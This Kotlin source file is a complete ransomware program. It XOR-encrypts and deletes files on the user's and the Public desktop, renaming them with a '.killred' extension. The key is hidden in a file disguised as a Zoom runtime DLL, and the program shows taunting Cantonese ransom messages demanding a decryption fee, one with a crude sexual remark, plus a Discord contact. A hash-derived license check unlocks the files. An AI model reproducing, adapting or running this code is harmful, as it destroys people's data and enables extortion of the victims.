package sexy.killred.encrypt

import mu.KotlinLogging
import sexy.killred.encrypt.HashCrypto.md5
import sexy.killred.encrypt.HashCrypto.sha1
import sexy.killred.encrypt.HashCrypto.sha256
import sexy.killred.encrypt.HashCrypto.sha512
import sexy.killred.encrypt.IOUtil.getCurrentUserDesktopPath
import sexy.killred.encrypt.IOUtil.toByteArray
import sexy.killred.encrypt.IOUtil.xor
import java.awt.Frame
import java.awt.Toolkit
import java.awt.datatransfer.Clipboard
import java.awt.datatransfer.StringSelection
import java.io.*
import java.util.*
import javax.swing.JOptionPane
import javax.swing.UIManager
import kotlin.math.absoluteValue


val logger = KotlinLogging.logger {}
val dir = File(System.getProperty("user.home") + "/AppData/Roaming/Zoom/bin/")
val dataFile = File(dir, "api-ms-win-crt-encrypt-l1-1-0.dll")

fun main() {
    val encryptFiles = mutableListOf<File?>()
    val deskTopPath = getCurrentUserDesktopPath() ?: return
    val publicDeskTopPath = deskTopPath.replace(System.getProperty("user.name"), "Public")

    ThreadUtil.runThread {
        IOUtil.findFolderFiles(encryptFiles, File(deskTopPath), dataFile.exists())
        IOUtil.findFolderFiles(encryptFiles, File(publicDeskTopPath), dataFile.exists())
    }

    val frame = Frame()
    frame.isAlwaysOnTop = true
    frame.state = 1

    runCatching {
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName())
    }


    if (dataFile.exists() && encryptFiles.isNotEmpty()) {
        logger.info { "Your file are encrypted!" }

        val uuid = getUUID().sha1().sha256().sha1().sha512().md5()
        var license: String? = null

        while (license != "${uuid}KILLREDHANDSOME".sha1().sha256().md5()) {
            val input = JOptionPane.showInputDialog(
                frame,
                "Please enter decrypt key, your license: $uuid",
                "Please enter license",
                3,
                UIManager.getIcon("OptionPane.warningIcon"),
                null,
                null
            ) as String
            license = input
            val stringSelection = StringSelection(uuid)
            val clipboard: Clipboard = Toolkit.getDefaultToolkit().systemClipboard
            clipboard.setContents(stringSelection, null)
            if (input != "${uuid}KILLREDHANDSOME".sha1().sha256().md5()) {
                JOptionPane.showMessageDialog(null, "\u5514\u597d\u9ce9\u649e\u5566\u597d\u5514\u597d\u5440")
            }
        }

        if (license == "${uuid}KILLREDHANDSOME".sha1().sha256().md5()) {
            val lastKey = getLastData()

            encryptFiles.forEach { decryptFile ->
                decryptFile ?: return@forEach
                if (!decryptFile.isFile || !decryptFile.canRead()) {
                    logger.error {
                        "Invalid file \"" + decryptFile.path + "\""
                    }
                } else {
                    val fileName = decryptFile.name

                    if (fileName.endsWith(".killred")) {
                        val inputStream = FileInputStream(decryptFile)
                        val byteArray = inputStream.toByteArray() ?: return

                        decryptFile.delete()

                        val outputStream = FileOutputStream(
                            File(
                                decryptFile.parent,
                                xor(fileName.replace(".killred", ""), lastKey.toInt())
                            )
                        )
                        outputStream.write(xor(byteArray, lastKey.toInt()))

                        inputStream.close()
                        outputStream.close()
                        logger.info { "Decrypted file $fileName" }
                    }
                }
            }
            JOptionPane.showMessageDialog(null, "\u591a\u8b1d\u5e6b\u896f")
            ThreadUtil.shutdown()
            throw On9Exception()
        } else {
            ThreadUtil.shutdown()
            throw On9Exception()
        }
    } else {
        logger.info {
            "Running in encrypt"
        }

        if (encryptFiles.isEmpty()) {
            IOUtil.findFolderFiles(encryptFiles, File(deskTopPath), false)
            IOUtil.findFolderFiles(encryptFiles, File(publicDeskTopPath), false)
        }

        val uniqueKey = genUniqueKey()

        encryptFiles.forEach { ripFile ->
            ripFile ?: return@forEach

            if (!ripFile.isFile || !ripFile.canRead()) {
                logger.error {
                    "Invalid file \"" + ripFile.path + "\""
                }
            } else {
                val fileName = ripFile.name
                val inputStream = FileInputStream(ripFile)
                val byteArray = inputStream.toByteArray() ?: return

                runCatching {
                    val file = File(ripFile.parent, xor(fileName, uniqueKey) + ".killred")
                    val outputStream = FileOutputStream(file)
                    outputStream.write(xor(byteArray, uniqueKey))
                    inputStream.close()
                    ripFile.delete()
                    outputStream.close()
                    logger.info { "Encrypted file $fileName" }
                }.onFailure {
                    logger.error { it }
                }
            }
        }

        JOptionPane.showMessageDialog(frame, "\u50bb\u4ed4\u4f60\u771f\u4fc2\u64b3?")
        JOptionPane.showMessageDialog(
            frame,
            "\u4e09\u5341\u868a\u89e3\u5bc6\u8cbb\uff0c\u5187\u9322\u5605\u8a71\u7540\u5c4e\u5ffd\u90fd\u53ef\u4ee5"
        )
        JOptionPane.showMessageDialog(frame, "\u4ef2\u5514\u591a\u8b1d\u6211?")
        JOptionPane.showMessageDialog(frame, "Discord: KillRED#7392, see you soon")
        val stringSelection = StringSelection(getUUID().sha1().sha256().sha1().sha512().md5())
        val clipboard: Clipboard = Toolkit.getDefaultToolkit().systemClipboard
        clipboard.setContents(stringSelection, null)
        ThreadUtil.shutdown()
        throw On9Exception()
    }
}

fun getUUID(): String {
    val process = Runtime.getRuntime().exec(arrayOf("wmic", "csproduct", "get", "uuid"))
    process.outputStream.close()
    val sc = Scanner(process.inputStream)
    sc.next()
    return sc.next()
}

fun genUniqueKey(): Int {
    val serial: String = getUUID()
    val uuid = serial.hashCode().absoluteValue + (1..Int.MAX_VALUE - serial.hashCode().absoluteValue).random()
    if (!dataFile.exists()) {
        dataFile.parentFile.mkdirs()
        dataFile.createNewFile()
    }
    val writer = BufferedWriter(FileWriter(dataFile))
    writer.write(AES.encrypt(uuid.toString(), getUUID().sha1().sha256().sha1().sha512().md5()))
    writer.close()
    return uuid
}


fun getLastData() : String {
    if (!dataFile.exists()) {
        logger.info { "Datafile does not exists" }
        return "null"
    }
    val buffer = BufferedReader(FileReader(dataFile))
    return AES.decrypt(buffer.readLine(), getUUID().sha1().sha256().sha1().sha512().md5())
}